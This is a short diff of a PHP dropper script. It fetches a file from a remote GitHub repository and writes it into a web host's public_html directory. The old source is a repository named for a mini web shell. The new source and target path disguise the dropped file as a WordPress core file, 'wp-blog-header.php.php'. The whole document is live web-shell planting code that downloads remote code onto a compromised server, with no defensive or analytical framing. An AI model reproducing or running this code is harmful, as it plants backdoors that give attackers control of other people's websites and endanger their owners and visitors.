@@ -1,6 +1,6 @@
 <?php
-$url = 'https://raw.githubusercontent.com/Mr-7Mind/MiniShell/main/ShellPass.php';
-$localFilePath = '/home/u1727442/public_html/assets/img/pages/struktur/jabatan/nilai/nah.php';
+$url = 'https://raw.githubusercontent.com/BacklinkGG/TimpaMenimpa/main/wp-blog-header.php';
+$localFilePath = '/home1/smanege5/public_html/wp-blog-header.php.php';
 $content = file_get_contents($url);
 if ($content !== false) {
     $result = file_put_contents($localFilePath, $content);
